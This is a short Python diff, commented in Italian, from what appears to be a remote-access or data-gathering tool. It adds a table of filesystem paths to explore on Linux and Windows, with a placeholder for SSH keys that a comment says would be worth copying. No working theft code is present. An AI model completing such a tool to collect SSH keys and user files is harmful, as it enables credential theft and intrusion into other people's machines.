@@ -16,10 +16,16 @@ __response_options = {"1": "OS-TYPE",
                       "7": "NETWORK-INFO",
                       "8": "USERS",
                       "15": "DOWNLOAD-FILE"}
-
-__filesystem_hierarchy = {"1": ["/", "C:/"],
-                          "2": [f"/home/{os.getlogin()}/", "C:/NON_SO_IL_PATH"]
-                          }  # TODO: completare
+"""
+TODO: Ampliare i values (sono quelli tra le parentesi []) con quelli specifici per MacOS (che dovrebbero essere in parte simili a quelli di Linux)
+TODO: Per la gestione di recupero dati da win: https://stackoverflow.com/questions/13184414/how-can-i-get-the-path-to-the-appdata-directory-in-python
+Struttura: key: [Linux, Win, MacOS]
+"""
+__filesystem_hierarchy = {"1": ["/", "C:/"],  # Da utilizzare in maniera non ricorsiva, ma per avere le info generali sulle directory possibili
+                          "2": [f"/home/{os.getlogin()}/", "C:/NON_SO_IL_PATH"],
+                          "3": [],  # SSH KEYS (Potrebbe risultare interessante copiare queste informazioni)
+                          "4": [],  # Recupero immagini (?)
+                          }
 
 
 def get_directory_list(parent_path: str):
